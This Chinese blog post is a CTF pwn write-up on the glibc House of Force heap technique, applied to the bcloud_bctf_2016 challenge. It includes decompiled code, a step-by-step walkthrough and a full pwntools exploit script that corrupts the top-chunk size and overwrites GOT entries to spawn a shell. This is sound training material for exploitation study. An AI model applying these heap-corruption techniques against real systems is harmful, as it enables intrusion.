<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Force2 | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Force2</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-12T09:16:25.023Z" id="updated"> 2023-09-12</time></div></span></div></div><hr><div id="post-content"><h1 id="House-Of-Force2"><a href="#House-Of-Force2" class="headerlink" title="House Of Force2"></a>House Of Force2</h1><p>基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。</p>
<p>如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。</p>
<p>然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。</p>
<h3 id="glibc源码："><a href="#glibc源码：" class="headerlink" title="glibc源码："></a>glibc源码：</h3><pre><code>// 获取当前的top chunk，并计算其对应的大小
victim = av-&gt;top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av-&gt;top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
</code></pre>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk</p>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3><pre><code>int add()
{
  int result; // eax
  int i; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )
    ;
  if ( i == 10 )
    return puts("Lack of space. Upgrade your account with just $100 :)");
  puts("Input the length of the note content:");
  v2 = choose();
  heap_array[i] = malloc(v2 + 4);
  if ( !heap_array[i] )
    exit(-1);
  dword_804B0A0[i] = v2;
  puts("Input the content:");
  readd(heap_array[i], v2, 10);
  printf("Create success, the id is %d\n", i);
  result = i;
  dword_804B0E0[i] = 0;
  return result;
}
</code></pre>
<p>add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写</p>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><pre><code>int edit()
{
  unsigned int v1; // [esp+14h] [ebp-14h]
  int v2; // [esp+18h] [ebp-10h]
  int v3; // [esp+1Ch] [ebp-Ch]

  puts("Input the id:");
  v1 = choose();
  if ( v1 &gt;= 0xA )
    return puts("Invalid ID.");
  v2 = heap_array[v1];
  if ( !v2 )
    return puts("Note has been deleted.");
  v3 = dword_804B0A0[v1];
  dword_804B0E0[v1] = 0;
  puts("Input the new content:");
  readd(v2, v3, 10);
  return puts("Edit success.");
}
</code></pre>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>int delete()
{
  unsigned int v1; // [esp+18h] [ebp-10h]
  void *index; // [esp+1Ch] [ebp-Ch]
  puts("Input the id:");
  v1 = choose();
  if ( v1 &gt;= 0xA )
    return puts("Invalid ID.");
  index = heap_array[v1];
  if ( !index )
    return puts("Note has been deleted.");
  heap_array[v1] = 0;
  dword_804B0A0[v1] = 0;
  free(index);  #UAF
  return puts("Delete success.");
}
</code></pre>
<p>delete函数在释放chunk时存在UAF漏洞</p>
<h3 id="自定义一个read函数"><a href="#自定义一个read函数" class="headerlink" title="自定义一个read函数"></a>自定义一个read函数</h3><pre><code>int __cdecl readd(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt; a2; ++i )
  {
    if ( read(0, &amp;buf, 1u) &lt;= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(a1 + i) = buf;
  }
  *(i + a1) = 0;
  return i;
}
</code></pre>
<p>三个参数，a1为要输入的地址，a2为输入大小，a3为截止符</p>
<h4 id="先把前面的一些东西写好"><a href="#先把前面的一些东西写好" class="headerlink" title="先把前面的一些东西写好"></a>先把前面的一些东西写好</h4><pre><code>from pwn import *
from LibcSearcher import *
context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
sh = process('./bcloud_bctf_2016')
#sh = remote('node4.buuoj.cn',26937)
elf = ELF('./bcloud_bctf_2016')
def add(size,content):
   sla('&gt;&gt;','1')
   sla('note content:',str(size))
   sa('content:',content)
 
def edit(index,content):
   sla('&gt;&gt;','3')
   sla('id:',str(index))
   sa('content:',content)
 
def delete(index):
   sla('&gt;&gt;','4')
   sla('id:',str(index))
</code></pre>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞<br class='item-img' data-src='https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"><br>strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来</p>
<pre><code>sa('name:','a'*64)
ru('a'*64)
heap_addr = u32(r(4)) - 0x8
lg('heap_addr',heap_addr)
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>再看另一个函数<br class='item-img' data-src='https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h3><pre><code>-0000005C v2 dd ?
-00000058 db ? ; undefined
-00000057 db ? ; undefined
..........
-00000016 db ? ; undefined
-00000015 db ? ; undefined
-00000014 v4 dd ?
-00000010 db ? ; undefined
-0000000F db ? ; undefined
-0000000E db ? ; undefined
-0000000D db ? ; undefined
</code></pre>
<p>这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）</p>
<pre><code>sa('Org:','a'*0x40)
sla('Host:',p32(0xFFFFFFFF))
top_chunk_addr = heap_addr  + 0x48*3 - 0x8
lg('top_chunk_addr',(top_chunk_addr))
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，<br>因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，</p>
<pre><code>offset = heap_array - （top_chunk_addr +0x8）- 0x8
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<p>heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，<br>之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，</p>
<pre><code>add(offset,'\n')	
add(0x18,'\n')
</code></pre>
<p>之后编辑chunk_1来修改heap_array数组</p>
<pre><code>puts_plt = elf.plt['puts']
__libc_start_main_got = elf.got['__libc_start_main']
free_got = elf.got['free']
edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\x00'*0x8)
</code></pre>
<p>此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）</p>
<pre><code>edit(1,p32(puts_plt) + b'\n')
</code></pre>
<p>此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址</p>
<pre><code>delete(2)
dbg()
</code></pre>
<p>free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址<br class='item-img' data-src='https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<pre><code>#本地
one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
#buu远程
#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
#libc = ELF('../../libc-2.23.so--32')
libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
onegadget = one_gadget[3] + libc_base
</code></pre>
<p>再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\x00”)，获得shell。</p>
<pre><code>    delete(1)
    itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038'><img src="https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png?ynotemdtimestamp=1663776491038" alt="在这里插入图片描述"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *
from LibcSearcher import *
context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
#定义gdb调试函数
def dbg():
        gdb.attach(sh)
        pause()
#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))

sh = process('./bcloud_bctf_2016')
#sh = remote('node4.buuoj.cn',26937)

elf = ELF('./bcloud_bctf_2016')
puts_plt = elf.plt['puts']
__libc_start_main_got = elf.got['__libc_start_main']
free_got = elf.got['free']
heap_array = 0x0804B120
 
def add(size,content):
   sla('&gt;&gt;','1')
   sla('note content:',str(size))
   sa('content:',content)
 
def edit(index,content):
   sla('&gt;&gt;','3')
   sla('id:',str(index))
   sa('content:',content)
 
def delete(index):
   sla('&gt;&gt;','4')
   sla('id:',str(index))
def main():
    sa('name:','a'*64)
    ru('a'*64)
    heap_addr = u32(r(4)) 
    lg('heap_addr',heap_addr)
    #dbg()
    sa('Org:','a'*0x40)
    #修改top chunk的size为-1（0xFFFFFFFF）
    sla('Host:',p32(0xFFFFFFFF))
    top_chunk_addr = heap_addr + 0x48*3-0x8
    lg('top_chunk_addr',(top_chunk_addr))
    offset = heap_array - (top_chunk_addr +0x8)- 0x8
    lg('offset',offset)
    add(offset,'') #0
    add(0x18,'\n') #1
    edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\x00'*8)
    edit(1,p32(puts_plt) + b'\n')
    #泄露__libc_start_main_got的地址
    delete(2)
    r(1)
    __libc_start_main_addr = u32(r(4))
    lg('__libc_start_main',__libc_start_main_addr)
    #dbg()
    '''
    libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
    libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
    system_addr = libc_base + libc.dump('system')
    lg('libc_base',(libc_base))
    lg('system_addr',(system_addr))
    edit(1,p32(system_addr) + b'\n')
    '''
    #本地
    one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
    libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
    #buu远程
    #one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    #libc = ELF('../../libc-2.23.so--32')
    libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
    onegadget = one_gadget[3] + libc_base
    edit(1,p32(onegadget) + b'\n')
    #getshell
    delete(1)
    itr()
main()
</code></pre>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Einherjar/">← 下一篇 House of Einherjar</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Lore/">House of Lore 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force2"><span class="toc-number">1.</span> <span class="toc-text">House Of Force2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">glibc源码：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">2.1.</span> <span class="toc-text">bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AAread%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.4.</span> <span class="toc-text">自定义一个read函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%8A%8A%E5%89%8D%E9%9D%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF%E5%86%99%E5%A5%BD"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">先把前面的一些东西写好</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.1.5.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%B8%83%E5%B1%80"><span class="toc-number">2.1.6.</span> <span class="toc-text">栈布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.1.7.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>